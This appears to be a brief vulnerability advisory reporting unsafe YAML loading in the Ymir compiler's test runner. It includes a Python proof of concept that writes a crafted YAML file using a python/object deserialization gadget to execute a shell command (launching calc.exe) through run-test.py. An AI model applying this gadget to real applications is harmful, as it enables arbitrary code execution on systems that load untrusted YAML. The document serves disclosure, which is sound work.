# Description

`Ymir-Test` contain the test of the ymir compiler are registered. They can be used to verify that the compiler does what is intended, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```python
import os

os.system('git clone https://github.com/GNU-Ymir/Ymir-Test')
os.chdir('Ymir-Test/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open('config.yml','w+').write(payload)

os.system('python3 run-test.py --test config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
